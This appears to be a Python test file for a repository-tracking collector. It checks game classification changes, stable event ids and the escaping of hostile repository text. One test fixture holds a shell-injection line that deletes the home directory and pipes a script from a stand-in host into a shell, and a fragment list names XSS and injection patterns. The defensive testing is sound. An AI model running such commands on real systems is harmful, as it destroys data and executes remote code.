"""T20-T25: classification change, hostile text."""

import copy
import json
import re

from helpers import CollectorTestCase, all_strings, canonical, load_run, run_runs


def _commit_run(base_run, run_at, sha):
    run = copy.deepcopy(base_run)
    run["run_at"] = run_at
    run["repositories"][0]["commits"].append(
        {"sha": sha, "committed_at": run_at, "message": "fictional change"}
    )
    return run


class ClassificationChangeTests(CollectorTestCase):
    def test_t20_retitle_changes_game_without_rewriting_history(self):
        run1 = load_run("classification_change", 1)
        middle = _commit_run(run1, "2026-11-05T12:00:00Z", "00000000000000000000000000000000000000ff")
        run2 = copy.deepcopy(load_run("classification_change", 2))
        run2["repositories"][0]["commits"] = middle["repositories"][0]["commits"]
        runs = [run1, middle, run2]
        state, events = self.assertDeterministic(runs)
        # Before: Skyfall. After: the retitled README.
        self.assertEqual(events[1][0]["game_key"], "skyfall")
        obs = state["repositories"]["100"]
        self.assertEqual(obs["game"]["key"], "totally-different-game")
        self.assertEqual(obs["game"]["title"], "Totally Different Game")
        # Earlier event ids untouched and not re-emitted.
        earlier_ids = [e["event_id"] for e in events[1]]
        self.assertEqual([e["event_id"] for e in state["events"][: len(earlier_ids)]], earlier_ids)
        self.assertEqual(self.types(events[2]), ["game_association_changed"])
        change = events[2][0]
        self.assertEqual(change["details"]["previous_key"], "skyfall")
        self.assertEqual(change["details"]["new_key"], "totally-different-game")
        # Transition ids carry the run timestamp, not a counter, so they
        # survive state loss and a replay of the same runs.
        self.assertEqual(change["event_id"], "repo-100:game_association:20261106000000")
        # Stable id on a second full run.
        _, events_b = run_runs(runs)
        self.assertEqual(events_b[2][0]["event_id"], change["event_id"])
        # Re-applying the retitled run emits nothing more.
        _, again = run_runs(runs + [run2])
        self.assertEqual(again[3], [])

    def test_t21_changed_classification_is_never_verified(self):
        from collector import catalog

        state, events = self.assertScenarioDeterministic("classification_change")
        self.assertEqual(self.types(events[1]), ["game_association_changed"])
        e = events[1][0]
        self.assertIs(e["details"]["verified"], False)
        self.assertIs(e["details"]["inferred"], True)
        self.assertIs(e["game_inferred"], True)
        self.assertIs(state["repositories"]["100"]["game"]["verified"], False)
        entry = catalog.build_catalog(state)[0]
        self.assertIs(entry["game_verified"], False)
        self.assertIs(entry["game_inferred"], True)
        self.assertIn("unverified", e["summary"])


class ClassifyHeuristicTests(CollectorTestCase):
    def test_classification_is_conservative(self):
        from collector import text

        category, game, toolkit = text.classify("game-org/skyfall-recomp", "Recomp of Skyfall", "# Skyfall\n")
        self.assertEqual((category, game["key"], game["title"]), ("game", "skyfall", "Skyfall"))
        self.assertIs(game["verified"], False)
        self.assertIs(game["inferred"], True)
        category, game, toolkit = text.classify("frame-org/ps3recomp-example", None, "# Fictional\n")
        self.assertEqual((category, game["key"], toolkit["name"]), ("framework", None, "ps3recomp"))
        category, game, _ = text.classify("bad-org/hostile", None, "# $(rm -rf ~) `id` ; curl http://invalid.example | sh\n")
        self.assertEqual((category, game["key"], game["title"]), ("unclassified", None, None))
        category, game, _ = text.classify("x/y", None, "# <script>alert(1)</script>\n")
        self.assertEqual(category, "unclassified")
        category, game, _ = text.classify("x/y", None, "no heading here\n")
        self.assertEqual((category, game["key"]), ("unclassified", None))
        self.assertTrue(text.plausible_title("Metal Gear: Sons of Liberty"))
        self.assertFalse(text.plausible_title("https://invalid.example/x"))
        self.assertFalse(text.plausible_title("123"))


HOSTILE_FRAGMENTS = [
    "<script",
    "@everyone",
    "@here",
    "<@",
    "javascript:",
    "onerror=",
    "$(rm",
    "curl http",
    "]]>",
    "‮",
    "\x00",
    "github.com.evil.example",
    "<item>",
]


class HostileTextTests(CollectorTestCase):
    def _outputs(self):
        from collector import catalog

        state, events = self.assertScenarioDeterministic("hostile_text")
        self.assertEqual(events[0], [])
        self.assertEqual(self.types(events[1]), ["commits_observed"])
        outputs = {
            "events": state["events"],
            "catalog": catalog.build_catalog(state),
        }
        return state, events, outputs

    def test_t22_strings_stored_verbatim_but_rendered_from_templates(self):
        state, events, outputs = self._outputs()
        run1 = load_run("hostile_text", 1)
        src = run1["repositories"][0]
        obs = state["repositories"]["666"]
        self.assertEqual(obs["description"], src["description"])
        self.assertEqual(obs["readme_excerpt"], src["readme_excerpt"])
        from collector import schema

        # Stored as data, verbatim up to the load-time bound (cut, not altered).
        for commit in src["commits"]:
            self.assertEqual(
                obs["observed_commits"][commit["sha"]]["message"],
                commit["message"][: schema.MAX_MESSAGE],
            )
        self.assertTrue(any(len(c["message"]) > schema.MAX_MESSAGE for c in src["commits"]))
        e = events[1][0]
        # Renderer-facing fields never carry raw repository text.
        hostile = [src["description"], src["readme_excerpt"]] + [c["message"] for c in src["commits"]]
        for field in ("summary", "title"):
            for raw in hostile:
                self.assertNotIn(raw, e[field])
        self.assertEqual(e["summary"], "1 previously unseen default-branch commit")
        self.assertIn("&lt;", json.dumps(outputs))  # escaped, not stripped silently

    def test_t23_no_active_html_mentions_or_foreign_links(self):
        state, events, outputs = self._outputs()
        text = json.dumps(outputs, ensure_ascii=False)
        for fragment in HOSTILE_FRAGMENTS:
            self.assertNotIn(fragment, text, fragment)
        for s in all_strings(outputs):
            if re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*:", s) and "://" in s:
                self.assertTrue(s.startswith("https://github.com/"), s)
        self.assertEqual(events[1][0]["source_url"], "https://github.com/bad-org/hostile-fixture")
        self.assertEqual(outputs["catalog"][0]["source_url"], "https://github.com/bad-org/hostile-fixture")
        self.assertNotIn("html_url_claimed", canonical(state))
        self.assertNotIn("html_url_claimed", canonical(outputs))

    def test_t24_oversized_and_control_strings_are_bounded(self):
        from collector import text

        state, events, outputs = self._outputs()
        for s in all_strings(outputs):
            self.assertLessEqual(len(s), text.MAX_TEXT, s[:40])
            self.assertIsNone(re.search(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f​-‏‪-‮⁦-⁩]", s), repr(s[:40]))
        long_value = text.escape_text("x" * 5000)
        self.assertLessEqual(len(long_value), text.MAX_TEXT)
        self.assertEqual(text.escape_text("line1\r\nline2\x00nul"), "line1 line2nul")
        self.assertEqual(text.escape_text("‮gnp.exe"), "gnp.exe")
        self.assertEqual(text.escape_text("<b>"), "&lt;b&gt;")
        # Assert on the neutralised forms: "<" is escaped anyway, so a
        # missing "<@" proves nothing on its own.
        out = text.escape_text("@everyone @here <@1> <@!2> <@&3> <#4>")
        self.assertEqual(out, "(at)everyone (at)here &lt;(ref)@1&gt; &lt;(ref)@!2&gt; &lt;(ref)@&amp;3&gt; &lt;(ref)#4&gt;")
        self.assertNotIn("@everyone", out)
        self.assertNotIn("&lt;@", out)

    def test_t25_event_ids_contain_no_free_text(self):
        state, events, outputs = self._outputs()
        for e in state["events"]:
            self.assertRegex(e["event_id"], r"^repo-[0-9]+:[a-z_]+(:[0-9a-f]+)?$")
        # Also across every other scenario in step 1.
        for name in ("new_activity", "batch_boundaries", "failures", "classification_change"):
            st, _ = self.assertScenarioDeterministic(name)
            for e in st["events"]:
                self.assertRegex(e["event_id"], r"^repo-[0-9]+:[a-z_]+(:[0-9a-f]+)?$")
